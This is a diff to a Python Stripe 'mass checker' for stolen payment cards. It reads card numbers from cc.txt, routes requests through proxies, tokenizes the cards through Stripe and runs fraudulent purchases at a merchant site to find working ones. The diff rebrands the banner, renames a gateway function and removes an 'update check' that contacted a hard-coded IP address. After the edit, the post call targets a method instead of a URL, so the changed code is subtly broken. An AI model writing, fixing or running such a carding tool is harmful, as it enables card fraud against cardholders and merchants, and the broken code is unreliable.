@@ -39,7 +39,7 @@ class StripeChecker():
         self.stripe_tokens = "https://api.stripe.com/v1/tokens"
 
         print("\n\n  {}------=[ {}BloodHub Premium Mass Checker {}]=------".format(fg[0], fg[1], fg[0]))
-        print("      {}          --= {}Created by Bloodhub {}=--          ".format(fg[0], fg[1], fg[0]))
+        print("      {}       --= {}Team SCB Numbawan{}=--          ".format(fg[0], fg[1], fg[0]))
         print("       {}------============================------\n".format(fg[0]))
 
         if not os.path.exists('live_cc.txt'):
@@ -66,17 +66,7 @@ class StripeChecker():
             print(" └─> Don't input proxy if you not use!")
         print(colorama.Fore.RESET)
         options = ['1', '2', '0']
-        up = input('[?] Check for update?[y/n] ')
-
-        if 'y' in up.lower():
-            print(colorama.Fore.YELLOW + "[*] Checking For Updates....")
-            try:
-                requests.get("http://52.211.14.150")
-                print(colorama.Fore.GREEN + "[+] Update Found!, Run the updater.py to update the checker")
-            except Exception:
-                print(colorama.Fore.BLUE  + "[-] No Updates Available.")
-        else:
-            pass
+       
 
         print(colorama.Fore.RESET)
         time.sleep(0.6)
@@ -94,7 +84,7 @@ class StripeChecker():
                 print('[-] Invalid Gateway')
 
             elif option == "1":
-                self.gateway1()
+                self.merchant1()
 
             elif option == "2":
                 self.gateway1_HighBalance()
@@ -102,8 +92,7 @@ class StripeChecker():
             else:
                 pass
 
-    def gateway1(self):
-
+    def merchant1(self):
         proxy_lists = []
         cc_list = open('cc.txt', 'r').read()
         cc_list = cc_list.split('\n')
@@ -198,7 +187,7 @@ class StripeChecker():
                 "stripeTokenType": "card",
                 "stripeEmail": email
             }
-            result_response = session.post(self.gateway1Purchase, proxies=proxy, data=result_data).text
+            result_response = session.post(self.merchant1, proxies=proxy, data=result_data).text
             print()
             result = BeautifulSoup(result_response, 'html.parser')
             if result.find('title').get_text() == "Noise Blocker: Order Error":
